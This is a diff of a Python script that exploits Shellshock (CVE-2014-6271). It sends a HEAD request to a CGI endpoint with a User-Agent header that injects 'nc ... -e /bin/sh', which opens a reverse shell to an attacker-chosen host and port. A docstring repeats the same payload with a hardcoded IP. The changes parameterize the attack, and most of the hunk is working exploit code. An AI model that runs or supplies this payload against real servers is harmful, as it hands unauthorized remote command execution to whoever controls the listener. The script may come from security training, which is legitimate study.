@@ -7,22 +7,29 @@ def shellshock_http_req(lhost, lport, rhost, rport, target_url):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
    s.connect((rhost, rport))
+   
+
+   '''
+   This technique might work
+   n = 5
+   s = str(n).encode()
+   '''
 
    ''' HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" '''
    # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string
    rhost_encoded = rhost.encode()
-   #rport_encoded = rport.encode()
    lhost_encoded = lhost.encode()
+   lport_bytes = str(lport).encode()
    #lport_encoded = lport.encode()
    #s.sendall(b"GET / HTTP1.1\r\nHost: 192.168.0.100\r\n\r\n")
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost)
    #s.sendall(b"GET / HTTP 1.1\r\nHost: %s\r\n\r\n" % rhost_encoded)
-   payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n" % lhost_encoded)
+   # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argument
+   payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
    recv_data = s.recv(4096)
    s.close()
 
-   return payload
-
+   return 
 
 ''' Paste in the URL from the shellshock_dect tool '''
 def shellshock_rev_payloads(lhost, lport, target_url):
